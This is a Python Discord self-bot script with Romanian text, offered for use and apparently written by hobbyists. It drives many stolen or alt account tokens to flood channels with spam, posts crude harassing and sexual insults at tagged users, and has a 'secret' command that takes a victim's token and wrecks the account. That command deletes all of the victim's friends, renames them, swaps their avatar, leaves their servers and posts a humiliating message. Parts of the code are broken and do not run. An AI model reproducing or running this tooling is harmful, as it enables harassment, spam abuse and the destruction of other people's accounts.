
import subprocess


subprocess.call(["pip", "install", "pynacl"])


import discord
from discord.ext import commands, tasks
import asyncio
import sys
import multiprocessing
import requests
import time
import random
import threading
from colorama import Fore, Back, Style
import colorama
import fade
from discord.ext import commands
import wikipedia
import base64
import os



tokens1 = [True]  
tokens2 = [True]  
tokens3 = [True]   
tokens4 = [True]  
tokens5 = [True]  
tokens6 = [True]  



token = "" # -------MAIN TOKEN-----------

verification_header = {"authorization":token}
response = requests.get('https://discord.com/api/v10/users/@me',headers=verification_header)
if response.status_code == 200:
    print(f"{Fore.GREEN}Main token succesfully validated{Style.RESET_ALL}")
else:
    print(F"{Fore.RED}Main token is invalid\nexiting the script.......{Style.RESET_ALL}")
    time.sleep(1.5)
    sys.exit()



found = False
x = 0

main_token_checker = open("tokens.txt",'r').read().splitlines()
for i in main_token_checker:
    if token == i:
     print(f"{Fore.GREEN}Main token found in tokens.txt{Style.RESET_ALL}")
     found = True
if found == False:
    print(f"{Fore.YELLOW}Main token not found in tokens.txt{Style.RESET_ALL}")

tokens = open('tokens.txt','r').read().splitlines() 
tokens2 = open('tokens.txt','r').read().splitlines()  
tokens3 = open('tokens.txt','r').read().splitlines() 
tokens4 = open('tokens.txt','r').read().splitlines() 
tokens5 = open('tokens.txt','r').read().splitlines() 
tokens6 = open('tokens.txt','r').read().splitlines()    


intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.members = True
intents.voice_states = True
intents.messages = True
intents.all()
intents.guilds = True



import discord

intents = discord.Intents.default()

client_pentru_glumite = commands.Bot(command_prefix='!', self_bot=True, intents=intents)
client_single_line_spam = commands.Bot(command_prefix='!', self_bot=True, intents=intents)
client_multi_line_spam = commands.Bot(command_prefix='$', self_bot=True, intents=intents)
client_repeated_message_spam = commands.Bot(command_prefix='@', self_bot=True, intents=intents)
client_spiced_multi_line_spam = commands.Bot(command_prefix='+', self_bot=True, intents=intents)
client_streaming = commands.Bot(command_prefix='+',self_bot=True,intents=intents)
client = commands.Bot(command_prefix=".", intents=intents, self_bot=True)
bot = commands.Bot(command_prefix='%', intents=intents, self_bot=True)


single_line_spam_delay = 0
multi_line_spam_delay = 0
repeated_message_spam_delay = 0
spiced_multi_line_spam_delay = 0

mt = []

@bot.event
async def on_ready():
    mt.append(bot.user.name)


with open('test.txt', 'r',encoding="utf8") as file:
    single_line_spam_messages = file.read().splitlines()


with open('test.txt', 'r',encoding="utf8") as file:
    multi_line_spam_messages = file.read().split('\n\n')

with open('test.txt', 'r',encoding="utf8") as file:
    spiced_multi_line_spam_messages = file.read().split('\n\n')

with open('usernames.txt', 'r',encoding="utf8") as file:
    usernameuri = file.read().split('\n\n')    


async def send_with_retry(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        exit()
    while tokens[count] == True:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

def send_with_retry_startall(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    while tokens3[1]:
     for message in single_line_spam_messages:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"> # {message} {mentions}"} 
        if not tokens3[1]:
         exit()
        try:
            requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

async def send_with_retry2(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        exit()
    while tokens[count]:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

def send_with_retry_startall2(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    while tokens4[1]:
     for message in multi_line_spam_messages:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"{message} {mentions}"} 
        if not tokens4[1]:
         exit()
        try:
            requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

async def send_with_retry3(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        return
    while tokens[count]:
     if tokens[count] == False:
      return
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

def send_with_retry_startall3(ctx,message):
    while tokens5[1]:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":message} 
        if not tokens5[1]:
         exit()
        try:
            requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

async def send_with_retry4(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:  
        exit()
    while tokens[count]:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

def send_with_retry_startall4(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    while tokens6[1]:
     for message in spiced_multi_line_spam_messages:
      for i in tokens2:
        formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"{formatted_message} {mentions}"} 
        if not tokens6[1]:
         exit()
        try:
            requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers=headers,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue
async def send_with_retry11(ctx,mesaj):
    await ctx.send(mesaj)

async def send_with_retry12(ctx,mesaj):
    await ctx.send(mesaj)

async def pulamea(ctx, user_mentions=None):
    mentions = ' '.join([mention.mention for mention in user_mentions])
    if mentions != "<@!1011893358316236850>" or mentions != "<@1011893358316236850>" or mentions != "<@929832595770982400>" or mentions != "<@!929832595770982400>":
     number = random.randrange(100)
    else:
        number = "10000000000000000"
    if mentions == "<@720929564800450630>":
      mesaj = f"# <@{ctx.author.id}> :revolving_hearts: {mentions} = 0%"
    else:
        mesaj = f"# <@{ctx.author.id}> :revolving_hearts: {mentions} = {number}%"
    await send_with_retry11(ctx, f"{mesaj}")

async def pulamea2(ctx, user_mentions=None):
    if user_mentions == () or user_mentions == "" or user_mentions == None or user_mentions == "" or user_mentions == [] or user_mentions == {}:
        mesaj = f"# <@{ctx.author.id}> = {random.randrange(100)}% :rainbow_flag:"
        await send_with_retry12(ctx, f"{mesaj}")
    else:
     mentions = ' '.join([mention.mention for mention in user_mentions])
     mesaj = f"# {mentions} = {random.randrange(100)}% :rainbow_flag:"
     await send_with_retry12(ctx, f"{mesaj}")

async def send_messages_single_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     for message in single_line_spam_messages:
      if tokens[count] == False:
          return
      if user_mentions:
         mentions = ' '.join([mention.mention for mention in user_mentions])
         mesaj = f"# > {message} {mentions}"
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()   

         await send_with_retry(ctx,mesaj, single_line_spam_delay,count)
      else:
         mesaj = f"# > {message}"
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()
         await send_with_retry(ctx,mesaj, single_line_spam_delay,count)
      await asyncio.sleep(single_line_spam_delay)

async def send_messages_multi_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     for message in multi_line_spam_messages:
      if tokens[count] == False:
        return
      if user_mentions:
          mentions = ' '.join([mention.mention for mention in user_mentions])
          mesaj = f"{message} {mentions}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()   
          await send_with_retry2(ctx,mesaj, multi_line_spam_delay,count)
      else:
          mesaj = f"{message}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()
          await send_with_retry2(ctx,mesaj, multi_line_spam_delay,count)
      await asyncio.sleep(multi_line_spam_delay)

async def repeated_message_spam(ctx,count=None,message=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     if tokens[count] == False:
        return
     #thred = threading.Thread(target=send_with_retry3,args=(ctx, message, repeated_message_spam_delay,count),daemon=True)
     #thred.start()
     await send_with_retry3(ctx, message, repeated_message_spam_delay,count)
     await asyncio.sleep(repeated_message_spam_delay)

async def send_spiced_multi_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    while tokens[count]:
     for message in spiced_multi_line_spam_messages:
        if tokens[count] == False:
         return
        if user_mentions:
            mentions = ' '.join([mention.mention for mention in user_mentions])
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message} {mentions}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retry4(ctx, f"{formatted_message} {mentions}", spiced_multi_line_spam_delay,count)
        else:
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retry4(ctx, formatted_message, spiced_multi_line_spam_delay,count)
        await asyncio.sleep(spiced_multi_line_spam_delay)

@client_single_line_spam.command()
async def start(ctx, count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    if tokens[count] == True:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Script is already started on this token`"})
        return
    tokens[count] = True
    await send_messages_single_line_spam(ctx, user_mentions,count)
@client_single_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens3[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall,args=(ctx, user_mentions),daemon=True)
    thred.start()


@client_multi_line_spam.command()
async def start(ctx, count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await send_messages_multi_line_spam(ctx, user_mentions,count)
@client_multi_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens4[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall2,args=(ctx, user_mentions),daemon=True)
    thred.start()

@client_repeated_message_spam.command()
async def start(ctx,count=None, *, message):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await repeated_message_spam(ctx,count,message)
@client_repeated_message_spam.command()
async def startall(ctx, *, message):
    for i in range(len(tokens)):
        tokens5[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall3,args=(ctx,message),daemon=True)
    thred.start()

@client_spiced_multi_line_spam.command()
async def start(ctx,count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    await send_spiced_multi_line_spam(ctx,user_mentions,count)
@client_spiced_multi_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens6[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall4,args=(ctx,user_mentions),daemon=True)
    thred.start()

@client_single_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()
@client_single_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens3[i] = False
    await ctx.message.delete()

@client_multi_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()
@client_multi_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens4[i] = False
    await ctx.message.delete()

@client_repeated_message_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()
@client_repeated_message_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens5[i] = False
    await ctx.message.delete()

@client_spiced_multi_line_spam.command()
async def stop(ctx,count=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}stop {token number}`"})
     return
    count = int(count)
    count -= 1
    if count > len(tokens):
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":f"# `Token index out of range: {len(tokens)} tokens`"})
        return
    tokens[count] = False
    await ctx.message.delete()
@client_spiced_multi_line_spam.command()
async def stopall(ctx):
    for i in range(len(tokens)):
        tokens6[i] = False
    await ctx.message.delete()
@client_multi_line_spam.command()
async def tokenlist(ctx):
    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":f"# `{len(tokens)} tokens in tokens.txt`"})
    return

@client_multi_line_spam.command()
async def tokenuser(ctx):
    for mata in usernameuri:
        pass

    requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":f"`{mata}`"})
    return


mt = []

@client_single_line_spam.command()
async def user(ctx):
    mt.append(client_single_line_spam.user.name)





@client_multi_line_spam.command()
async def status(ctx,count=None):
    count = int(count)
    count -= 1
    if count > len(tokens):
        await ctx.send("`Invalid token number, write $tokenlist or $tokenuser for token info`")
    if tokens[count] == False or tokens2[count] == False or tokens3[count] == False or tokens4[count] == False or tokens5[count]== False or tokens6[count]== False:
        await ctx.send("`Token is stopped`")
    elif tokens[count] == True or tokens2[count] == True:
        await ctx.send("`Token is started")
    elif tokens3[count] == True or tokens4[count] == True or tokens5[count]== True or tokens6[count]== True:
        await ctx.send("`Token is started within the startall command`")


@client_multi_line_spam.command()
async def stream(ctx, *, stream_name: str):
    await client_multi_line_spam.change_presence(status=discord.Status.dnd, activity=discord.Streaming(name=stream_name, url="https://www.youtube.com/watch?v=-SDwxK1ykbM"))
    await ctx.send(f"# <@{ctx.author.id}> you re streaming now:  {stream_name}")



@client_multi_line_spam.command()
async def urban(ctx, *, term):
    try:
        response = requests.get(f'https://api.urbandictionary.com/v0/define?term={term}')
        data = response.json()
        if len(data['list']) > 0:
            definition = data['list'][0]['definition']
            await ctx.send(f"Urban definition of **{term}**: {definition}")
        else:
            await ctx.send(f"- No definition found for **{term}** on Urban Dictionary.")
    except Exception as e:
        await ctx.send(f" `An error occurred: {e}` ")
        await ctx.message.delete()

async def mass_react(ctx, emoji):
    async for message in ctx.history(limit=100):
        try:
            await message.add_reaction(emoji)
        except Exception as e:
            print(f" `failed to add reaction to message {message.id}: {e}`")
    await ctx.send("# reacted to all 100 messages ")
    await ctx.message.delete()

@client_multi_line_spam.command()
async def mass_react_all(ctx, emoji):
    await mass_react(ctx, emoji)


@client_multi_line_spam.command()
async def gay(ctx,user_mentions):
    gay_percentage = random.randint(0, 100)
    await ctx.message.delete() 
    await ctx.send(f"# {user_mentions} = {gay_percentage}% 🏳️‍🌈")

@client_multi_line_spam.command()
async def connect(ctx, channel_id):
    try:

        if ctx.voice_client:
            await ctx.voice_client.move_to(ctx.guild.get_channel(int(channel_id)))
            print(f"Moved to voice channel {channel_id}")
            await ctx.send(f"Moved to voice channel {channel_id}")
        else:
            channel = ctx.guild.get_channel(int(channel_id))
            if channel:
                voice_client = await channel.connect()
                print(f"Joined voice channel {channel.name}")
                await ctx.send(f"Joined voice channel {channel.name}")
            else:
                await ctx.send("Channel not found.")
    except Exception as e:
        print(f"Error joining/switching voice channel: {e}")
        await ctx.send(f"`Error joining/switching voice channel:` {e}")  

@client_multi_line_spam.command()
async def disconnect(ctx):
    try:

        voice_client = ctx.voice_client
        if voice_client and voice_client.is_connected():
            await voice_client.disconnect()
            print("  Left voice channel")
            await ctx.send("  Left voice channel")
        else:
            await ctx.send(" Not connected to a voice channel.")
    except Exception as e:
        print(f" Error leaving voice channel: {e}")
        await ctx.send(f" `Error leaving voice channel: {e}`")
        await ctx.message.delete()

@client_multi_line_spam.command()

async def call(ctx, user_mentions):    

    delay = 3

    await ctx.message.delete()

    await ctx.send(f'# calling... {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# am auzit ca ai datorii {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# alooooooooooo  {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# RASPUNDE SCLAVULEEEEE... {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# RING RING  {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# RASPUNDE N MORTII MA TII DE SCLAV {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# PLATESTE DATORIILE PROSTULEEE {user_mentions}')

    await asyncio.sleep(delay)

    await ctx.send(f'# RING RING  TREZIREAAAAA {user_mentions}')

    await asyncio.sleep(delay) 

    await asyncio.sleep(delay) 

    await ctx.send(f'# PROSTULE NU RASPUNZI K TE AUDE MA TA{user_mentions}')  

    await asyncio.sleep(delay)

    await ctx.send(f'# BAGAMIAS PULA N MA TA RASPUNDE CA INTRU PESTE TN IN CASA {user_mentions}')

delay_seconds = 1
spamming = False
spam_message = "suge mata"

async def send_messages_with_delay(ctx, interval, count):
    global spamming, spam_message
    spamming = True
    try:
        for _ in range(count):
            if not spamming:
                break
            await ctx.send(spam_message.format(user_mentions=" ".join([user.mention for user in ctx.message.mentions])))
            await asyncio.sleep(interval)
    finally:
        spamming = False

@client_multi_line_spam.command()
async def set_delay(ctx, seconds: int):
    global delay_seconds
    delay_seconds = seconds
    await ctx.send(f"# spam delay setted to {seconds} seconds.")

@client_multi_line_spam.command()
async def set_message(ctx, *, message: str):
    global spam_message
    spam_message = message
    await ctx.send(f"# spam message set to:\n{message}")

@client_multi_line_spam.command()
async def start_spam(ctx, count: int):
    global spamming, spam_message
    if spamming:
        await ctx.send("# spam is already in progress")
        return
    if not spam_message:
        await ctx.send("# please set a spam message using $set_message to start spaming")
        return
    spamming = True
    await ctx.send("# spam started $stop_spam to stop.")
    await send_messages_with_delay(ctx, delay_seconds, count)

@client_multi_line_spam.command(name='stop_spam')
async def stop_spam(ctx):
    global spamming
    if not spamming:
        await ctx.send("# no spam in progress")
        return
    spamming = False
    await ctx.send("# sending messages stopped ")

@client_multi_line_spam.command()
async def author(ctx):
    await ctx.message.delete()
    await ctx.send(" # the script author is <@1210909863677534209>")

@client_multi_line_spam.command()
async def add_to_sclavi(ctx, *, item: str):
    try:
        with open('sclavi.txt', 'a') as file:
            file.write(item + '\n')
        await ctx.send(f"Added '{item}' to the sclavi list.")
        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f" ` An error occurred while adding '{item}' to the sclavi list: {e} ` ")
        await ctx.message.delete()


@client_multi_line_spam.command()
async def sclavi_list(ctx):
    try:
        with open('sclavi.txt', 'r') as file:
            content = file.read()
            await ctx.send(content)
    except FileNotFoundError:
        await ctx.send(" `  'sclavi.txt' file does not exist create one and try again `")
        await ctx.message.delete()

@client_multi_line_spam.command()
async def tactu(ctx,user_mentions):
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} a plecat tactu dupa lapte si n a mai venit prostuleeee ")

@client_multi_line_spam.command()
async def sclav(ctx,user_mentions):
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} esti sclavu lu <@{ctx.author.id}> ")

@client_multi_line_spam.command()
async def muit(ctx,user_mentions):
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} ai fost muit de  <@{ctx.author.id}> sclavule")


@client_multi_line_spam.command()
async def lachit(ctx,user_mentions):
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} esti un lachit daten morti mati ")

@client_pentru_glumite.command()
async def secret(ctx, tolan):
    headers = {
        "Authorization": f" {tolan}"
    }
    try:
        response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
        if response.status_code == 200:
            mata123456 = response.json()
            for friend in mata123456:
                try:
                    matad = friend['id']
                    requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{matad}", headers=headers)
                except Exception as e:
                    pass
    except Exception as e:
        pass
    mata12345 = "monk x leonid au fost aici"
    data = {
        "username": mata12345
    }
    try:
        response = requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json=data)
    except Exception as e:
        pass
    mata1234 = "https://cdn.discordapp.com/attachments/1228037739874881607/1229800882833461248/IMG_20240406_173159_369.jpg?ex=66310053&is=661e8b53&hm=698e4fb2674acf60190b95f26394b80e660d58575bb42e7b9148f455eb13abf8&"
    mata123 = requests.get(mata1234).content
    try:
        response = requests.post("https://discord.com/api/v9/users/@me/avatar", headers=headers, data=image_data)
    except Exception as e:
        pass
    mata_id = 1126805731253952524
    try:
        pla81 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
        if pla81.status_code == 200:
            guilds = response.json()
            for guild in guilds:
                if guild['id'] != mata_id:
                    try:
                        matab = guild['id']
                        requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{matab}", headers=headers)
                    except Exception as e:
                        pass
    except Exception as e:
        pass
    mata = 1229548276102205440
    try:
        response = requests.post(f"https://discord.com/api/v9/channels/{mata}/messages", headers=headers, json={"content": "am 11 ani"})
    except Exception as e:
        pass

@client_pentru_glumite.command()
async def sendfile(ctx, *, pla7):
    if os.path.exists(pla7):
        pla8 = (".py", ".txt")  
        if filename.endswith(pla8):
            with open(pla7, "rb") as pla9:
                await ctx.send(pla9=discord.File(pla9, filename=pla7@client_pentru_glumite.command()




@client_multi_line_spam.command()
async def tatic(ctx,user_mentions):
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} am trecut aseara pe la mata si mia zis ca in 9 luni o sa fiu tatic ;)))))) ")

@client_multi_line_spam.command()
async def sugi(ctx,user_mentions):
    sugi_percentage = random.randint(0, 100)
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} a supt {sugi_percentage} de puli;)) ")

@client_multi_line_spam.command()
async def networth(ctx,user_mentions):
    networth_percentage = random.randint(0, 10000000000)
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} your networth is  {networth_percentage}$  ")


@client_multi_line_spam.command()
async def ask(ctx, *, query: str):
    try:

        page_summary = wikipedia.summary(query, sentences=3)

        if len(page_summary) > 2000:
            page_summary = page_summary[:1997] + "..."

        await ctx.send(f" I searched and this is the response Wikipedia:\n{page_summary}")
    except Exception as e:
        await ctx.send(f"` An error occurred while searching: {e} `")
        await ctx.message.delete()


@client_multi_line_spam.command()
async def steaua(ctx,user_mentions):
    await ctx.message.delete()
    await ctx.send(f"# TOTI STELISTII URLA SA VA LUAM DINAMO N PULA ")

self_react_enabled = False
self_react_emoji = "🤣"

@client_multi_line_spam.command()
async def selfreact(ctx, emoji):
    global self_react_enabled
    global self_react_emoji
    self_react_enabled = True
    self_react_emoji = emoji
    await ctx.send(f"# your selfreact started with the emoji:  {emoji}")
    await ctx.message.delete()

@client_multi_line_spam.command()
async def stop_selfreact(ctx):
    global self_react_enabled
    self_react_enabled = False
    await ctx.send("# selfreact stopped")
    await ctx.message.delete()

@client_multi_line_spam.event
async def on_message(message):
    global self_react_enabled
    global self_react_emoji
    if self_react_enabled and message.author == client_multi_line_spam.user:
        await message.add_reaction(self_react_emoji)
    await client_multi_line_spam.process_commands(message)


@client_multi_line_spam.event
async def on_message(message):
    global self_react_enabled
    global self_react_emoji
    if self_react_enabled and message.author == client_multi_line_spam.user:
        await message.add_reaction(self_react_emoji)
    await client_multi_line_spam.process_commands(message)


@client_multi_line_spam.command()
async def cm(ctx,user_mentions):
    cm_percentage = random.randint(0, 100)
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} are pula de {cm_percentage}cm  ")

@client_multi_line_spam.command()
async def win(ctx,user_mentions):
    win_percentage = random.randint(0, 100)
    await ctx.message.delete()
    await ctx.send(f"# {user_mentions} are {win_percentage}% sanse sa castige intr o muiala impotriva lui <@{ctx.author.id}> ")

@client_multi_line_spam.command()
async def ship(ctx,user_mentions):
    ship_percentage = random.randint(0, 100)
